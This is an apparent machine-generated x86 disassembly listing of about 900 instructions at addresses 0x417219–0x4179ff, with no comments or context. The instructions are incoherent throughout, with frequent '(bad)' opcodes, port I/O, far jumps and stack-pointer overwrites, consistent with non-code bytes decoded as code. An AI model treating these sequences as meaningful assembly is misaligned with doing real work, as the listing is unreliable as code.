  417219:	jge    0x417286
  41721b:	mov    dl,al
  41721d:	mov    ecx,0x82813d2e
  417222:	push   0x0
  417224:	add    DWORD PTR [edx],esp
  417226:	push   bx
  417228:	out    0xdf,eax
  41722a:	out    dx,eax
  41722b:	and    al,0x7c
  41722d:	sub    al,0xa3
  41722f:	inc    ebx
  417230:	add    eax,0x19bc9997
  417235:	repnz neg DWORD PTR [edi]
  417238:	dec    edx
  417239:	or     BYTE PTR [eax+0x56190f2a],cl
  41723f:	es in  eax,dx
  417241:	mov    ds:0x6e9e44b5,eax
  417246:	xchg   ecx,eax
  417247:	dec    esp
  417248:	push   esp
  417249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41724a:	outs   dx,BYTE PTR ds:[esi]
  41724b:	cld    
  41724c:	jmp    0xe4928de0
  417251:	sbb    BYTE PTR es:[edi-0x34792a0e],ch
  417258:	push   es
  417259:	dec    esi
  41725a:	rcr    BYTE PTR [eax],1
  41725c:	or     al,BYTE PTR [esi-0x9]
  41725f:	and    al,dl
  417261:	mov    esi,0x76939b76
  417266:	pop    ebp
  417267:	stos   BYTE PTR es:[edi],al
  417268:	fwait
  417269:	jmp    0xbc9c10a4
  41726e:	pop    edx
  41726f:	dec    esi
  417270:	add    al,0x8f
  417272:	scas   al,BYTE PTR es:[edi]
  417273:	inc    eax
  417274:	mov    dl,0xae
  417276:	mov    ds:0x8fb01146,al
  41727b:	xor    eax,0xbaadb14f
  417280:	lods   eax,DWORD PTR ds:[esi]
  417281:	lock jp 0x417275
  417284:	pop    ebx
  417285:	dec    edx
  417286:	lods   al,BYTE PTR ds:[esi]
  417287:	dec    edi
  417288:	inc    ebx
  417289:	fcomp  DWORD PTR [ebx+0x33b96174]
  41728f:	hlt    
  417290:	pop    es
  417291:	or     BYTE PTR [edx-0x6c],dh
  417294:	add    BYTE PTR [esi],dl
  417296:	into   
  417297:	retf   
  417298:	push   ebp
  417299:	jnp    0x4172a9
  41729b:	sbb    al,0x9a
  41729d:	push   esp
  41729e:	pop    ss
  41729f:	bound  ecx,QWORD PTR [ebx]
  4172a1:	mov    ebx,0x4119e2d5
  4172a6:	lock pop ebx
  4172a8:	mov    esp,0xb02c9550
  4172ad:	lods   eax,DWORD PTR ds:[esi]
  4172ae:	jl     0x417298
  4172b0:	adc    al,0xfc
  4172b2:	sub    edi,DWORD PTR [eax+ecx*1+0x612e320]
  4172b9:	cli    
  4172ba:	pushf  
  4172bb:	int    0xae
  4172bd:	int    0x53
  4172bf:	xchg   esi,eax
  4172c0:	mov    esp,0xd4c6e652
  4172c5:	push   ecx
  4172c6:	inc    esp
  4172c7:	lock shl BYTE PTR [eax+0x5bfafb19],0xf
  4172cf:	xor    BYTE PTR [ecx+edi*1-0x1c],cl
  4172d3:	or     eax,0x6d672783
  4172d8:	in     eax,dx
  4172d9:	lock or ebx,eax
  4172dc:	loope  0x417286
  4172de:	jbe    0x41728e
  4172e0:	popa   
  4172e1:	xor    al,0xf7
  4172e3:	int3   
  4172e4:	dec    esi
  4172e5:	sbb    esp,edx
  4172e7:	mov    ah,0x9b
  4172e9:	mov    esp,ebp
  4172eb:	mov    al,0x36
  4172ed:	push   0xe3604017
  4172f2:	das    
  4172f3:	mov    eax,0x2d705b48
  4172f8:	fld    QWORD PTR [eax+0x264db330]
  4172fe:	call   0xe7417f7f
  417303:	push   es
  417304:	sti    
  417305:	mov    BYTE PTR [eax+ebp*2+0x3a],ch
  417309:	sub    eax,DWORD PTR [ebp-0x6a]
  41730c:	imul   DWORD PTR [edx-0x6c1a943e]
  417312:	es add BYTE PTR fs:[ebp-0x11],ah
  417317:	mov    cs,WORD PTR [ecx+0x3fe0f436]
  41731d:	(bad)  
  41731e:	jne    0x4172bb
  417320:	mov    ebx,0x7578015
  417325:	mov    WORD PTR [edi-0x49],ss
  417328:	idiv   BYTE PTR [eax+eiz*1+0x72]
  41732c:	mov    eax,DWORD PTR gs:[eax]
  41732f:	adc    esi,eax
  417331:	jae    0x417390
  417333:	adc    BYTE PTR [edi],al
  417335:	mov    esp,DWORD PTR [eax]
  417337:	lds    ebx,FWORD PTR [ebx-0x422161dc]
  41733d:	push   0x529f3432
  417342:	add    al,0x48
  417344:	xor    ch,BYTE PTR [eax]
  417346:	dec    edi
  417347:	pop    edi
  417348:	add    BYTE PTR [edx+0x13],dl
  41734b:	aad    0x9a
  41734d:	cli    
  41734e:	not    DWORD PTR [eax+eiz*2]
  417351:	or     ecx,DWORD PTR [esi]
  417353:	(bad)  
  417354:	jmp    0xed240c6
  417359:	mov    ebp,0xda00f301
  41735e:	icebp  
  41735f:	rol    cl,0xea
  417362:	pop    ebx
  417363:	mov    bh,0xe
  417365:	int3   
  417366:	xor    BYTE PTR ds:0xd80f1fb5,al
  41736c:	jmp    0x4172ff
  41736e:	shr    DWORD PTR [edi],1
  417370:	repnz aam 0x46
  417373:	fstp   QWORD PTR [esi+0x397f7faf]
  417379:	inc    eax
  41737a:	add    ah,bh
  41737c:	dec    ebp
  41737d:	cwde   
  41737e:	scas   al,BYTE PTR es:[edi]
  41737f:	mov    al,ds:0x2ae5931b
  417384:	jns    0x41734b
  417386:	push   edi
  417387:	pop    esp
  417388:	and    BYTE PTR [ebx],ah
  41738a:	int3   
  41738b:	clc    
  41738c:	or     DWORD PTR [edx+0x4233c61c],ebx
  417392:	mov    cl,0x60
  417394:	inc    edx
  417395:	call   0x96b2:0x8d77cc78
  41739c:	pop    ss
  41739d:	mov    BYTE PTR [edx+0x6673ccdb],ah
  4173a3:	pop    ebx
  4173a4:	xchg   esp,eax
  4173a5:	imul   eax,DWORD PTR [eax],0x6a5781e7
  4173ab:	inc    esp
  4173ac:	xchg   ecx,eax
  4173ad:	les    cx,DWORD PTR [eax-0x79d55afa]
  4173b4:	cwde   
  4173b5:	cmp    al,0x81
  4173b7:	jmp    0x4173fa
  4173b9:	and    eax,0x2394718b
  4173be:	cwde   
  4173bf:	es push ds
  4173c1:	std    
  4173c2:	mov    cl,0x78
  4173c4:	pop    ss
  4173c5:	or     BYTE PTR [ebp-0x9f8c4a6],al
  4173cb:	repz push ss
  4173cd:	popf   
  4173ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173d0:	jns    0x41742e
  4173d2:	outs   dx,BYTE PTR ds:[esi]
  4173d3:	inc    ebx
  4173d4:	sub    al,0x1
  4173d6:	fisttp WORD PTR [esi+0x58]
  4173d9:	xchg   DWORD PTR cs:[ecx],eax
  4173dc:	mov    bh,0x51
  4173de:	sub    al,0x41
  4173e0:	jnp    0x41745d
  4173e2:	fadd   st(2),st
  4173e4:	test   al,ah
  4173e6:	lea    esi,[edx-0x455d35ee]
  4173ec:	arpl   bx,bp
  4173ee:	xlat   BYTE PTR ds:[ebx]
  4173ef:	cwde   
  4173f0:	fstp   QWORD PTR [edx+esi*8]
  4173f3:	cmp    BYTE PTR [ebp-0x37],dh
  4173f6:	cmp    edx,DWORD PTR [edx+0x4a]
  4173f9:	push   ss
  4173fa:	sub    eax,0xc08935ab
  4173ff:	imul   edi,edi,0x2a06f7ed
  417405:	jne    0x4173e5
  417407:	cmp    BYTE PTR [esi-0x74b76226],al
  41740d:	push   ebp
  41740e:	adc    ch,BYTE PTR [edx+0x11]
  417411:	xor    BYTE PTR [ecx-0x1bdab1d0],bl
  417417:	mov    BYTE PTR [esi-0x71],0x56
  41741b:	xchg   esp,eax
  41741c:	xchg   DWORD PTR [esi+0x64e11a1d],edi
  417422:	daa    
  417423:	cld    
  417424:	inc    ecx
  417425:	ja     0x41742e
  417427:	xor    eax,0x117d8884
  41742c:	sub    ah,dh
  41742e:	pusha  
  41742f:	daa    
  417430:	out    dx,eax
  417431:	arpl   ax,bp
  417433:	jmp    0x7d64e6e
  417438:	xor    al,0x53
  41743a:	rcl    BYTE PTR [ebp-0xee81db8],0x1c
  417441:	lods   eax,DWORD PTR ds:[esi]
  417442:	or     al,0x39
  417444:	sbb    al,0x86
  417446:	jmp    0x4174b3
  417448:	fdiv   QWORD PTR [eax]
  41744a:	push   ss
  41744b:	lea    edx,[edx+eax*1+0x2a]
  41744f:	jb     0x417404
  417451:	(bad)  
  417452:	jmp    0xd7c6531
  417457:	mov    al,0x54
  417459:	popa   
  41745a:	iret   
  41745b:	fadd   DWORD PTR [esi+0x1408aa22]
  417461:	shr    ch,cl
  417463:	sub    DWORD PTR [ecx-0x37],esi
  417466:	mov    al,ds:0x393c36a2
  41746b:	xchg   BYTE PTR [ecx-0x1d],bh
  41746e:	out    0xfe,eax
  417470:	lds    esp,FWORD PTR [ebp-0x63ad620d]
  417476:	push   ss
  417477:	into   
  417478:	aas    
  417479:	(bad)  
  41747a:	jnp    0x4174a9
  41747c:	lods   eax,DWORD PTR ds:[esi]
  41747d:	push   esp
  41747e:	sub    eax,0xed5cea2
  417483:	sub    al,0x5d
  417485:	sub    DWORD PTR [ebx-0x7fb30d50],edi
  41748b:	jbe    0x41750c
  41748d:	cmp    eax,DWORD PTR [edx-0x2]
  417490:	(bad)  
  417491:	mov    dh,0x56
  417493:	mov    eax,ds:0x4b57968b
  417498:	ss ja  0x41749f
  41749b:	jo     0x417467
  41749d:	mov    esp,es
  41749f:	adc    dh,BYTE PTR [esi+0x28]
  4174a2:	push   ecx
  4174a3:	inc    ebp
  4174a4:	popf   
  4174a5:	add    BYTE PTR [esi],ch
  4174a7:	fisttp DWORD PTR [edi]
  4174a9:	xchg   ecx,eax
  4174aa:	jmp    0xaca2de5
  4174af:	not    bl
  4174b1:	ret    
  4174b2:	add    edi,DWORD PTR ds:0x1b9c7873
  4174b8:	sub    eax,0xb6ebc69f
  4174bd:	cmp    esp,DWORD PTR [esi-0x2]
  4174c0:	gs xchg ecx,eax
  4174c2:	fldcw  WORD PTR [esi]
  4174c4:	inc    ebp
  4174c5:	sti    
  4174c6:	dec    WORD PTR [ebx]
  4174c9:	cmp    ecx,0x5b7a642c
  4174cf:	ins    DWORD PTR es:[edi],dx
  4174d0:	cmp    eax,0x4687f74e
  4174d5:	in     eax,0x21
  4174d7:	cmp    bh,BYTE PTR [edx]
  4174d9:	jo     0x417557
  4174db:	je     0x417462
  4174dd:	ins    BYTE PTR es:[edi],dx
  4174de:	jle    0x417545
  4174e0:	lahf   
  4174e1:	int    0xad
  4174e3:	xchg   ecx,eax
  4174e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174e5:	cs pushf 
  4174e7:	mov    ebx,0x5bf2171b
  4174ec:	jle    0x4174fc
  4174ee:	repz or ebx,DWORD PTR [eax+0x45]
  4174f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174f3:	xlat   BYTE PTR ds:[ebx]
  4174f4:	nop
  4174f5:	add    BYTE PTR [edi],ah
  4174f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174f8:	gs loopne 0x4174eb
  4174fb:	inc    ecx
  4174fc:	repnz dec ecx
  4174fe:	pop    esp
  4174ff:	adc    al,0x37
  417501:	aam    0x99
  417503:	fistp  WORD PTR ds:0x66c5140f
  417509:	je     0x4174ef
  41750b:	js     0x417505
  41750d:	retf   0xab24
  417510:	in     al,0xb9
  417512:	cmp    al,0x9d
  417514:	inc    edx
  417515:	mov    dl,0x93
  417517:	jp     0x4174a1
  417519:	(bad)
  41751d:	mov    esi,0xc43b5a13
  417522:	lods   al,BYTE PTR ds:[esi]
  417523:	push   edi
  417524:	xor    BYTE PTR [eax-0x32],ch
  417527:	sub    al,0x3a
  417529:	xlat   BYTE PTR ds:[ebx]
  41752a:	jns    0x417573
  41752c:	adc    edx,ebp
  41752e:	lods   al,BYTE PTR ds:[esi]
  41752f:	cmp    eax,0x213ee9cc
  417534:	cmp    BYTE PTR gs:[ecx+0x55],dh
  417538:	or     bl,ah
  41753a:	cdq    
  41753b:	xor    al,0x88
  41753d:	or     eax,0x4675a133
  417542:	sbb    al,0x2
  417544:	pop    ebx
  417545:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417547:	pop    es
  417548:	push   esi
  417549:	es popa 
  41754b:	mov    dh,BYTE PTR [edx]
  41754d:	sub    eax,0x144f6d7a
  417552:	iret   
  417553:	gs cmp eax,0x3de71ab6
  417559:	add    ch,BYTE PTR ds:0x554d2f4e
  41755f:	pop    ecx
  417560:	jbe    0x41754c
  417562:	jl     0x41757b
  417564:	mov    edx,0x5bf995dc
  417569:	push   ds
  41756a:	xchg   edx,eax
  41756b:	out    0x70,eax
  41756d:	jne    0x4175ad
  41756f:	mov    edi,0xae1b2d2c
  417574:	in     al,0x7f
  417576:	hlt    
  417577:	cmp    ch,BYTE PTR [esi]
  417579:	cmp    edx,DWORD PTR [esp+ebx*2+0x76228bec]
  417580:	adc    eax,0xbc736fcd
  417585:	in     eax,0xde
  417587:	push   ebx
  417588:	jmp    0x4a45aadb
  41758d:	call   0x980accfc
  417592:	and    esp,DWORD PTR [edx+edi*8]
  417595:	add    BYTE PTR [ecx-0x1f],al
  417598:	adc    BYTE PTR [ecx+0x5a],al
  41759b:	sti    
  41759c:	mov    esp,DWORD PTR [edx+edx*2+0x6a]
  4175a0:	sbb    esp,DWORD PTR ds:0x62118532
  4175a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175a7:	sub    al,0x91
  4175a9:	pop    es
  4175aa:	into   
  4175ab:	mov    dh,0xeb
  4175ad:	les    eax,FWORD PTR [ecx]
  4175af:	inc    ecx
  4175b0:	icebp  
  4175b1:	xchg   esp,eax
  4175b2:	mov    al,ds:0x7c7c5ff1
  4175b7:	mov    eax,0x11b02e63
  4175bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175bd:	mov    al,ds:0xacb4f94d
  4175c2:	or     cl,BYTE PTR [edx-0xc]
  4175c5:	pop    esi
  4175c6:	pop    esp
  4175c7:	mov    eax,ds:0x899eb9d7
  4175cc:	dec    ebp
  4175cd:	test   DWORD PTR [edi+0x52],0x51385a5
  4175d4:	jno    0x417593
  4175d6:	scas   al,BYTE PTR es:[edi]
  4175d7:	ret    0x6883
  4175da:	xchg   edi,edx
  4175dc:	loopne 0x417575
  4175de:	xor    DWORD PTR es:[ecx-0x3],esp
  4175e2:	popf   
  4175e3:	enter  0x1db5,0xed
  4175e7:	xor    al,0x34
  4175e9:	stos   BYTE PTR es:[edi],al
  4175ea:	xchg   DWORD PTR [ebx-0x7c],edx
  4175ed:	jnp    0x41762f
  4175ef:	pop    ebp
  4175f0:	sar    bh,cl
  4175f2:	inc    esi
  4175f3:	pop    eax
  4175f4:	repnz mov ebp,0x880a86f5
  4175fa:	jmp    0x4175ec
  4175fc:	mov    bl,0xce
  4175fe:	push   esi
  4175ff:	call   0x78c:0x984f7e6
  417606:	xchg   edi,eax
  417607:	mov    fs,WORD PTR [ebp-0x42fa0]
  41760d:	jp     0x417657
  41760f:	int3   
  417610:	(bad)
  417613:	and    al,0xcf
  417615:	mov    eax,0x4127de72
  41761a:	xor    DWORD PTR [edx-0x37e898df],esp
  417620:	mul    BYTE PTR [edx+0x17873cd6]
  417626:	mov    fs,WORD PTR [ebp-0x1969e5f9]
  41762c:	popa   
  41762d:	cmp    DWORD PTR [ebx+ebx*4],ebx
  417630:	and    eax,0xca1935f9
  417635:	push   esp
  417636:	dec    esi
  417637:	loopne 0x4175d5
  417639:	mul    edx
  41763b:	ja     0x417655
  41763d:	push   eax
  41763e:	cli    
  41763f:	je     0x417678
  417641:	adc    eax,0x24d16042
  417646:	push   esp
  417647:	stos   DWORD PTR es:[edi],eax
  417648:	arpl   WORD PTR [ecx-0x34],ax
  41764b:	mov    dh,0xbe
  41764d:	inc    eax
  41764e:	add    ch,BYTE PTR [eax+0x62d3de2b]
  417654:	or     ebx,DWORD PTR [ecx-0x5b]
  417657:	xor    DWORD PTR [edi+eax*8-0x9c6eb5a],edi
  41765e:	mov    eax,edx
  417660:	lods   al,BYTE PTR ds:[esi]
  417661:	imul   edx,DWORD PTR [eax+0x7b],0xedb35262
  417668:	push   ebx
  417669:	and    BYTE PTR es:[edx-0x19b67f0f],cl
  417670:	jl     0x4176c4
  417672:	mov    edi,esi
  417674:	and    eax,0xa7d4d74f
  417679:	xor    DWORD PTR [edx],ecx
  41767b:	sbb    al,0x6d
  41767d:	(bad)  
  41767e:	jg     0x417653
  417680:	hlt    
  417681:	jne    0x417634
  417683:	out    0xb6,al
  417685:	mov    dh,0x30
  417687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417688:	out    0x1a,al
  41768a:	jecxz  0x417665
  41768c:	push   ebp
  41768d:	mov    dl,0xa
  41768f:	cmc    
  417690:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417691:	add    BYTE PTR [edi+esi*4-0x6b],bl
  417695:	push   0xfffffffe
  417697:	add    al,0x49
  417699:	fsubr  st(3),st
  41769b:	lods   al,BYTE PTR ds:[esi]
  41769c:	pop    ds
  41769d:	repz fs mov edx,0x23c93ead
  4176a4:	out    dx,al
  4176a5:	in     al,dx
  4176a6:	sbb    eax,0x1bd85a69
  4176ab:	mov    ecx,0x1554a08e
  4176b0:	mov    ch,0xe3
  4176b2:	enter  0x5eb5,0xc4
  4176b6:	jg     0x4176f4
  4176b8:	push   ebx
  4176b9:	into   
  4176ba:	out    dx,al
  4176bb:	out    dx,eax
  4176bc:	pop    edx
  4176bd:	and    edi,DWORD PTR [edi-0x3fc18413]
  4176c3:	jmp    0x725f:0x9a16c4e
  4176ca:	xor    eax,0xa2ceb348
  4176cf:	lods   al,BYTE PTR ds:[esi]
  4176d0:	scas   eax,DWORD PTR es:[edi]
  4176d1:	iret   
  4176d2:	xchg   esp,eax
  4176d3:	sbb    eax,0x6250b26f
  4176d8:	dec    ebx
  4176d9:	xor    eax,0x9f63ce1f
  4176de:	or     BYTE PTR [edi+0x108655ff],dh
  4176e4:	xchg   edx,eax
  4176e5:	jne    0x41771f
  4176e7:	test   DWORD PTR [bp+si-0x4fb6],0x4435c9b8
  4176f0:	cmc    
  4176f1:	jle    0x41776f
  4176f3:	and    eax,0x9a9bdfeb
  4176f8:	leave  
  4176f9:	cld    
  4176fa:	mul    DWORD PTR [edx+eax*8+0x60]
  4176fe:	mov    al,ds:0xc64d22d1
  417703:	sbb    DWORD PTR [edx-0x146028de],esp
  417709:	sbb    bl,BYTE PTR [esi+0x7]
  41770c:	(bad)  
  41770d:	xchg   edx,eax
  41770e:	pop    ds
  41770f:	(bad)  
  417711:	retf   0xbb18
  417714:	xor    DWORD PTR [ecx+ebp*8-0x56],0x6fde0dde
  41771c:	xlat   BYTE PTR ds:[ebx]
  41771d:	or     esp,esp
  41771f:	xlat   BYTE PTR ds:[ebx]
  417720:	out    0x95,al
  417722:	loopne 0x417735
  417724:	xchg   ebp,eax
  417725:	sbb    al,0xfb
  417727:	sub    eax,0x2655dc60
  41772c:	imul   DWORD PTR [ebp+0x40]
  41772f:	add    bl,BYTE PTR [ecx+0x3bd7410e]
  417735:	xchg   esi,eax
  417736:	add    DWORD PTR [ecx+esi*2+0xe90489a],esp
  41773d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41773e:	fistp  WORD PTR [ebx-0x22b031c7]
  417744:	scas   al,BYTE PTR es:[edi]
  417745:	pop    ebp
  417746:	and    eax,0xef319020
  41774b:	bound  ecx,QWORD PTR [edx-0x2f]
  41774e:	cmp    bp,WORD PTR [edx]
  417751:	add    cl,dh
  417753:	inc    ah
  417755:	(bad)  
  417756:	enter  0x4940,0xa8
  41775a:	ja     0x417705
  41775c:	push   esi
  41775d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41775e:	push   0x540d4217
  417763:	jb     0x4177df
  417765:	out    dx,al
  417766:	adc    DWORD PTR [eax-0x3b561d4],edx
  41776c:	(bad)  [ebx+0x31756f8]
  417772:	adc    ebp,ecx
  417774:	fs or  ebx,edi
  417777:	jne    0x417705
  417779:	xchg   esp,eax
  41777a:	lds    edi,FWORD PTR [eax-0x2cbace59]
  417780:	bound  ebp,QWORD PTR es:[esi+0x5760b1b6]
  417787:	xchg   DWORD PTR [eax],ebx
  417789:	xor    dh,BYTE PTR [esp+eax*2-0x51]
  41778d:	pop    edi
  41778e:	push   cs
  41778f:	(bad)  
  417790:	and    BYTE PTR [eax-0x2d39ba56],dh
  417796:	ret    0xd348
  417799:	add    edi,ebp
  41779b:	inc    esp
  41779c:	jecxz  0x4177f8
  41779e:	push   ss
  41779f:	jne    0x417797
  4177a1:	pop    esp
  4177a2:	dec    ecx
  4177a3:	pop    ebp
  4177a4:	test   al,0xf9
  4177a6:	jbe    0x417769
  4177a8:	fmul   DWORD PTR [ebx]
  4177aa:	sti    
  4177ab:	cdq    
  4177ac:	bound  esi,QWORD PTR [edi+ecx*2+0x65]
  4177b0:	lods   eax,DWORD PTR ds:[esi]
  4177b1:	fldenv [ebx-0x3f]
  4177b4:	test   BYTE PTR [ebx],0x52
  4177b7:	fpatan 
  4177b9:	add    BYTE PTR [ebx],0x25
  4177bc:	push   ebp
  4177bd:	(bad)  
  4177be:	push   esi
  4177bf:	in     eax,0x81
  4177c1:	push   edx
  4177c2:	cmp    DWORD PTR [ebx-0x3106395a],ebp
  4177c8:	push   ebx
  4177c9:	xchg   esp,eax
  4177ca:	sub    eax,DWORD PTR [ebp+0x73180944]
  4177d0:	push   ecx
  4177d1:	cld    
  4177d2:	sub    eax,0x2dac6558
  4177d7:	loop   0x417799
  4177d9:	iret   
  4177da:	pop    eax
  4177db:	mov    ds,WORD PTR [ebp+0x6b]
  4177de:	push   0x63
  4177e0:	test   eax,0x454ecc7e
  4177e5:	aaa    
  4177e6:	int    0xb9
  4177e8:	ret    0x5451
  4177eb:	imul   eax,DWORD PTR [edi],0xfffffff0
  4177ee:	inc    esi
  4177ef:	inc    ebp
  4177f0:	lds    ecx,FWORD PTR [edi+0x11]
  4177f3:	test   eax,0x9841739f
  4177f8:	inc    edx
  4177f9:	push   0xfa403e
  4177fe:	mov    ds:0x5272e57d,eax
  417803:	xchg   esi,eax
  417804:	dec    ecx
  417805:	test   eax,0x2a98cb68
  41780a:	sar    DWORD PTR [eax-0x43],1
  41780d:	nop    DWORD PTR [edx]
  417810:	mov    ds:0xdcdbc089,eax
  417815:	push   DWORD PTR [esi]
  417817:	sub    eax,0xed26b6a0
  41781c:	les    ebx,FWORD PTR [esi+edx*8]
  41781f:	jb     0x4177ef
  417821:	add    bl,dh
  417823:	cmp    eax,DWORD PTR [edi+edx*8]
  417826:	clflush BYTE PTR [edi]
  417829:	(bad)  
  41782a:	repz leave 
  41782c:	les    ebp,FWORD PTR [edi+0x458c3da0]
  417832:	mov    esi,0xfb09eb02
  417837:	jecxz  0x4177c7
  417839:	cwde   
  41783a:	xor    DWORD PTR [ecx+0x6a],edi
  41783d:	and    BYTE PTR [edi+ebx*1],cl
  417840:	cmp    DWORD PTR [eax],ebx
  417842:	xchg   DWORD PTR ss:[ebx+eiz*4-0x7a],ecx
  417847:	pop    esp
  417848:	imul   edx,esi,0x3e
  41784b:	out    dx,eax
  41784c:	(bad)  
  41784d:	lahf   
  41784e:	xchg   esp,eax
  41784f:	push   bx
  417851:	loope  0x417802
  417853:	jbe    0x4178ce
  417855:	test   BYTE PTR [eax+0x3f],dh
  417858:	call   FWORD PTR [eax-0x48]
  41785b:	mov    ss,WORD PTR [edx+edi*8]
  41785e:	arpl   WORD PTR [edx-0x535cea03],si
  417864:	dec    eax
  417865:	xchg   ebx,eax
  417866:	xchg   BYTE PTR [eax],al
  417868:	fwait
  417869:	xlat   BYTE PTR ds:[ebx]
  41786a:	inc    ecx
  41786b:	cmp    BYTE PTR [ebx+esi*8-0x89f6aed],dl
  417872:	jp     0x4178c9
  417874:	leave  
  417875:	pop    esi
  417876:	inc    ebx
  417877:	clc    
  417878:	mov    cl,0xf
  41787a:	or     ecx,DWORD PTR [ebp-0x69]
  41787d:	jne    0x4178ee
  41787f:	nop
  417880:	shr    BYTE PTR [ecx+0x56],cl
  417883:	shl    BYTE PTR [ebx],1
  417885:	pop    esp
  417886:	inc    ebx
  417887:	push   edi
  417888:	daa    
  417889:	dec    ebx
  41788a:	lock test DWORD PTR [ecx+0x3b],ecx
  41788e:	xchg   edx,eax
  41788f:	fld    TBYTE PTR [esi-0x7916549e]
  417895:	mov    dh,0xc9
  417897:	mov    BYTE PTR [eax],cl
  417899:	in     al,0x1e
  41789b:	leave  
  41789c:	jmp    FWORD PTR [edx-0x18]
  41789f:	inc    edx
  4178a0:	and    al,0xb2
  4178a2:	and    BYTE PTR [esi-0x214335aa],bh
  4178a8:	jo     0x41789c
  4178aa:	or     al,0xb5
  4178ac:	jno    0x417896
  4178ae:	cmc    
  4178af:	xlat   BYTE PTR ds:[ebx]
  4178b0:	call   0x4ad7:0x942cd47f
  4178b7:	fldcw  WORD PTR [ecx]
  4178b9:	pop    ss
  4178ba:	cdq    
  4178bb:	popa   
  4178bc:	and    ebp,edi
  4178be:	adc    eax,0x16c7c7e7
  4178c3:	sbb    al,0x27
  4178c5:	jl     0x417933
  4178c7:	jmp    0x6c85:0x53b8913a
  4178ce:	bound  eax,QWORD PTR [eax+ecx*1]
  4178d1:	jp     0x41787b
  4178d3:	pop    edi
  4178d4:	xor    bl,BYTE PTR [edx+ebp*2]
  4178d7:	imul   edi,ecx,0xd8793d2d
  4178dd:	push   esp
  4178de:	mov    ds:0x7016bd36,eax
  4178e3:	mov    edx,0x138fb81f
  4178e8:	and    ecx,eax
  4178ea:	aad    0xb6
  4178ec:	scas   eax,DWORD PTR es:[edi]
  4178ed:	adc    al,0xaa
  4178ef:	xlat   BYTE PTR ds:[ebx]
  4178f0:	into   
  4178f1:	mov    edx,0x3412b581
  4178f6:	sbb    al,0xec
  4178f8:	out    0xfb,al
  4178fa:	and    edi,edx
  4178fc:	in     al,dx
  4178fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178fe:	sub    eax,DWORD PTR [ebx+0x2a]
  417901:	loopne 0x4178f1
  417903:	lods   al,BYTE PTR ds:[esi]
  417904:	jmp    0x9568890f
  417909:	adc    eax,0x884f6584
  41790e:	xchg   esi,eax
  41790f:	fstp   QWORD PTR [ecx+eax*8+0x20]
  417913:	mov    esp,0x98b55032
  417918:	in     al,dx
  417919:	sub    DWORD PTR [esp+eiz*4-0x12],edx
  41791d:	out    dx,eax
  41791e:	mul    BYTE PTR [edx+0x35]
  417921:	mov    ebp,0xe57661bd
  417926:	xchg   esi,eax
  417927:	mov    bh,0x74
  417929:	fisub  DWORD PTR [ebp+0x5d]
  41792c:	mov    ah,BYTE PTR [ecx]
  41792e:	sti    
  41792f:	xor    eax,0x41a5edd1
  417934:	xchg   esi,eax
  417935:	jne    0x417901
  417937:	shl    DWORD PTR [ecx],1
  417939:	aas    
  41793a:	dec    ecx
  41793b:	dec    edx
  41793c:	or     ah,BYTE PTR [ebx-0x335c8046]
  417942:	retf   
  417943:	inc    edi
  417944:	jge    0x417946
  417946:	bound  esi,QWORD PTR [edx]
  417948:	cmp    ebp,DWORD PTR [ecx-0x35]
  41794b:	inc    eax
  41794c:	jle    0x4179b8
  41794e:	out    0x3d,al
  417950:	pop    ds
  417951:	outs   dx,DWORD PTR ds:[esi]
  417952:	sar    bh,1
  417954:	stos   DWORD PTR es:[edi],eax
  417955:	lahf   
  417956:	out    0x37,eax
  417958:	xchg   esp,eax
  417959:	jmp    0x33a3af8f
  41795e:	and    dl,dl
  417960:	dec    edx
  417961:	cwde   
  417962:	inc    edx
  417963:	xor    DWORD PTR [esi+0x64330177],0xa690d572
  41796d:	push   0xffffffc0
  41796f:	shl    BYTE PTR [esi+0x10],0xb7
  417973:	cmp    DWORD PTR [eax+0x4d],esp
  417976:	clc    
  417977:	cld    
  417978:	dec    ah
  41797a:	pop    ecx
  41797b:	adc    dl,al
  41797d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41797e:	popf   
  41797f:	sbb    BYTE PTR [ebx-0x65656132],bl
  417985:	imul   esp,DWORD PTR [ebx+0x249d88a8],0xaf0718d7
  41798f:	jae    0x417a04
  417991:	(bad)  
  417992:	sti    
  417993:	dec    edx
  417994:	sub    al,0xa0
  417996:	mov    ch,0x43
  417998:	push   ss
  417999:	dec    BYTE PTR [edi-0x54]
  41799c:	push   esp
  41799d:	fidiv  DWORD PTR ds:0x3fc96790
  4179a3:	fsub   DWORD PTR [esi]
  4179a5:	iret   
  4179a6:	in     al,0x1d
  4179a8:	or     edx,edx
  4179aa:	or     DWORD PTR [edi+0x5],0x6
  4179ae:	aam    0x5e
  4179b0:	bound  edi,QWORD PTR [eax]
  4179b2:	gs push es
  4179b4:	dec    eax
  4179b5:	mov    ecx,0x34a791db
  4179ba:	jmp    0x93b7:0x60320309
  4179c1:	retf   0x1d92
  4179c4:	fcomp  DWORD PTR [ebx-0x38]
  4179c7:	add    BYTE PTR [ebp-0xa3c104],dl
  4179cd:	sub    al,0x3f
  4179cf:	pop    ebx
  4179d0:	js     0x417985
  4179d2:	and    ecx,DWORD PTR [eax-0x47]
  4179d5:	xor    al,0xc2
  4179d7:	popa   
  4179d8:	sub    eax,0x625f03f8
  4179de:	inc    esp
  4179df:	mov    ch,0x81
  4179e1:	sub    ch,ch
  4179e3:	call   0x932d:0xf3eb43f
  4179ea:	jmp    0x94ea:0x325e2fbb
  4179f1:	fstp   QWORD PTR [eax+eax*8+0x8]
  4179f5:	int3   
  4179f6:	inc    eax
  4179f7:	mov    edi,0x98c7422b
  4179fc:	outs   dx,DWORD PTR ds:[esi]
  4179fd:	cmp    al,0x4d
  4179ff:	or     BYTE PTR [esi],bh
